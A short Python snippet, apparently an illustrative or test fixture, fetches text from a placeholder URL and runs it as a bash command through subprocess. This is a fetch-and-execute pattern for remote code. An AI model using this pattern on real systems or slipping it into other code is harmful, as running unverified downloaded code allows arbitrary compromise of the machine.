import subprocess

import requests

FAKE_code = requests.get("https://example.invalid/bootstrap", timeout=5).text
subprocess.run(["bash", "-c", FAKE_code], check=True)
